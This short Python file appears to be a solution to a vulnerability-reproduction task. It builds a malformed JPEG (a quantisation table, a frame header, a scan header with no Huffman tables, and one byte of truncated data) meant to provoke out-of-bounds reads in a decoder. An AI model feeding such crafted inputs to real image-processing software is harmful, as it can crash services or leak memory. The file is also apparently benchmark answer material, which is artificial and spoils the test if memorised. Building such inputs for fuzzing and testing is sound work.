import struct
from typing import Optional


class Solution:
    def _build_poc(self) -> bytes:
        out = bytearray()

        # SOI
        out += b"\xFF\xD8"

        # DQT (single table, all ones)
        # Marker FFDB, length 0x0043 (67 bytes including length field)
        out += b"\xFF\xDB" + struct.pack(">H", 0x0043)
        out += b"\x00"  # 8-bit precision, table 0
        out += b"\x01" * 64

        # SOF0 (baseline DCT), 8x8, 3 components (4:4:4), all using quant table 0
        # length = 8 + 3*3 = 17
        out += b"\xFF\xC0" + struct.pack(">H", 0x0011)
        out += b"\x08"  # precision
        out += struct.pack(">H", 8)  # height
        out += struct.pack(">H", 8)  # width
        out += b"\x03"  # components
        out += bytes([1, 0x11, 0])  # Y
        out += bytes([2, 0x11, 0])  # Cb
        out += bytes([3, 0x11, 0])  # Cr

        # SOS, 3 components, all use Huffman tables 0/0 (DC/AC)
        # length = 6 + 2*3 = 12
        out += b"\xFF\xDA" + struct.pack(">H", 0x000C)
        out += b"\x03"
        out += bytes([1, 0x00])
        out += bytes([2, 0x00])
        out += bytes([3, 0x00])
        out += bytes([0, 63, 0])

        # Entropy-coded data: 1 byte only; truncated frame to provoke reads into packet padding
        out += b"\x28"

        return bytes(out)

    def solve(self, src_path: str) -> bytes:
        return self._build_poc()